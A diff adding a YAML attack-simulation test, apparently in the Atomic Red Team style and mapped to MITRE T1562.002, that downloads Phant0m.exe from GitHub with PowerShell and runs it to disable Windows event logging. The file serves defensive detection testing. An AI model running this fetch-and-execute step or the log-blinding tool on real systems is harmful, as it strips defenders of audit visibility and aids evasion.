@@ -1,0 +1,35 @@
+api_version: "2.0"
+name: Makes Eventlog blind with Phant0m
+description: |
+    Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog
+args:
+    - name: file_name
+      type: path
+      default: PathToAtomicsFolder\T1562.002\bin\Phant0m.exe
+uuid: 3ddf3d03-f5d6-462a-ad76-2c5ff7b6d741
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1562: Impair Defenses'
+    subtechniques:
+        - 'T1562.002: Disable Windows Event Logging'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        Phant0m.exe must exist on disk at specified location (#{file_name})
+      inline: |
+        if (Test-Path "#{file_name}") {exit 0} else {{New-Item -Type Directory (split-path "#{file_name}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1562.002/bin/Phant0m.exe" -OutFile "#{file_name}" -UseBasicParsing
+        }}
+      executor: powershell
+    - name: makes-eventlog-blind-with-phant0m
+      inline: |
+        "{{.Args.file_name}}"
+      executor: command_prompt
+      cleanup:
+        inline: |
+            echo "Sorry you have to reboot"
+        executor: command_prompt
